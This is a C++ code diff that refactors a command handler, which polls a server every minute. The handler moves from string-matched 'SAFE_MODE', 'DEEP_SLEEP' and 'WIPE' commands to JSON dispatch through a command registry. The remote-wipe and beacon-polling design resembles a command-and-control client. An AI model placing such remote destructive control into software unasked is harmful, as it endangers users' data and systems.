@@ -1,10 +1,11 @@
 #include "CommandHandler.h"
 #include "Globals.h"
-#include "Wipe.h"
+#include "CommandRegistry.h"
 #include <curl/curl.h>
 #include <iostream>
 #include <chrono>
 #include <thread>
+#include "json.hpp"
 
 CommandHandler::CommandHandler(const std::string& server) : server_(server) {}
 
@@ -23,20 +24,17 @@ void CommandHandler::poll() {
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
         CURLcode res = curl_easy_perform(curl);
-        if(res == CURLE_OK) {
-            if(resp.find("SAFE_MODE") != std::string::npos) {
-                g_safe_mode.store(true);
-                std::cout << "Entering safe mode" << std::endl;
-                break;
-            }
-            if(resp.find("DEEP_SLEEP") != std::string::npos) {
-                g_deep_sleep.store(true);
-                std::cout << "Entering deep sleep" << std::endl;
-                break;
-            }
-            if(resp.find("WIPE") != std::string::npos) {
-                perform_wipe();
-                break;
+        if(res == CURLE_OK && !resp.empty()) {
+            try {
+                auto json = nlohmann::json::parse(resp);
+                for(const auto& cmd : json["commands"]) {
+                    if(CommandRegistry::instance().dispatch(cmd)) {
+                        if(g_safe_mode.load() || g_deep_sleep.load()) break;
+                    }
+                }
+                if(g_safe_mode.load() || g_deep_sleep.load()) break;
+            } catch(const std::exception& e) {
+                std::cerr << "Invalid command payload: " << e.what() << std::endl;
             }
         }
         std::this_thread::sleep_for(std::chrono::minutes(1));
